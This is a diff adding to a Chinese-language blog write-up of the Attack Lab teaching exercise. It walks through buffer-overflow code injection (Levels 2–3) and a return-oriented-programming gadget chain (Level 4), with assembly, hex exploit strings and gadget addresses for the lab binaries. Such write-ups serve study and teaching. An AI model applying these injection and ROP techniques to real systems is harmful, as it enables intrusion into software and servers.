@@ -53,7 +53,7 @@ void test()
 
 ## Level 2
 
-目的是通过缓冲区溢出，使test函数调用getbuf函数后，返回到touch2函数开始处，并以指定数值作为参数，为此需要注入代码。
+目标是通过缓冲区溢出，使test函数调用getbuf函数后，返回到touch2函数开始处，并以指定整数值作为参数，为此需要注入代码。
 
 注入指令代码，
 {% highlight nasm %}
@@ -65,7 +65,7 @@ void test()
 
 注意，指令中用的是立即数，小心编写指令。
 
-溢出两个地址，会产生段错误，因为原先第二个位置的值被覆盖了，其不是地址值。
+溢出两个地址，会产生段错误，可能是因为原先栈位置的值被使用了。
 
 题目要求使用 ret 转移控制，可以通过指令压入 touch2 开始地址。
 
@@ -86,8 +86,79 @@ c3 /* retq */
 78 dc 61 55 00 00 00 00 /* buf start address 0x5561dc78 */
 {% endhighlight %}
 
+## Level 3
+
+目标是通过缓冲区溢出，使test函数调用getbuf函数后，返回到touch3函数开始处，并以指定字符串作为参数，为此需要注入代码。
+
+需要注意的是，由于 touch3 函数会调用 hexmatch 与 strncmp 函数，栈空间会变化与重写，字符串数据不能简单地放在 buf 中。
+
+字符串数据放在缓冲区溢出的地址 0x5561dca8 处，注入指令代码，
+{% highlight nasm %}
+ # Level 3 injection code
+	movq $0x5561dca8, %rdi	# string start address
+	push $0x4018fa		# push touch3 address
+	retq			# return touch3
+{% endhighlight %}
+
+注入代码与数据的对应十六进制表示为，
+{% highlight nasm %}
+48 c7 c7 a8 dc 61 55 /* mov    $0x5561dca8,%rdi */
+68 fa 18 40 00 /* pushq  $0x4018fa */
+c3 /* retq */
+30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 /* 27 bytes */
+78 dc 61 55 00 00 00 00 /* buf start address 0x5561dc78 */
+35 39 62 39 39 37 66 61 /* cookie 59b997fa ASCII value */
+{% endhighlight %}
+
+## Level 4
+
+第二部分的 rtarget 开始(1)使用栈随机化，使得注入代码难以定位，(2)限制栈区域内存为 nonexecutable (不可执行)，即使通过溢出地址定位到注入代码，程序也不会执行(发生段错误)。
+
+因此，不是注入代码进行攻击，而是利用现有代码。例如，
+{% highlight nasm %}
+0000000000400f15 <setval_210>:
+	400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi)
+	400f1b: c3 retq
+{% endhighlight %}
+
+通过溢出地址，可以将 PC(Program Counter) 定位到 0x400f18 处，序列 48 89 c7 是指令 movq %rax, %rdi 的编码。由此，我们可以改变程序行为。
+
+我们可以说 movl $0xc78948d4,(%rdi) 这个指令是，
+> this code contains a gadget
+
+本阶段的目标同 Level 2 一样，只是需要通过抽取 gadget 完成参数赋值。根据 Lab 限定的范围与提示，我们需要完成以下两个指令(可插入 nop)，
+{% highlight nasm %}
+popq %rax
+movq %rax, %rdi
+{% endhighlight %}
+
+相应的函数为，
+
+function | start address | gadget address | instruction
+--- | --- | --- | ---
+addval_219 | 0x4019a7 | 0x4019ab | popq %rax
+setval_426 | 0x4019c3 | 0x4019c5 | movq %rax, %rdi
+
+为此构造的 exploit string 的十六进制表示为，
+{% highlight nasm %}
+30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 /* 40 bytes */
+ab 19 40 00 00 00 00 00 /* popq %rax instruction address */
+fa 97 b9 59 00 00 00 00 /* para value to %rax : 0x59b997fa */
+c5 19 40 00 00 00 00 00 /* movq %rax, %rdi instruction address 0x4019c5 */
+ec 17 40 00 00 00 00 00 /* touch2 start address */
+{% endhighlight %}
+
+## Level 5
 
 待续。
+
+## Conclusions
+
+通过 Level1~3 的实验我们可以看到，(1)通过缓冲区溢出返回地址，可以使程序跳转到指定地址，(2)在不限制内存的可执行代码区域时，用户可以向缓冲区内注入代码。
+
+如果 ctarget 是一个网络服务器，我们将可以向远程机器注入代码，改变服务器的行为。
+
+通过 Level 4 我们可以看到，如何绕过两种防止缓冲区溢出攻击的机制，即通过已有代码的片段(gadget)改变程序行为。
 
 {% highlight nasm %}
 
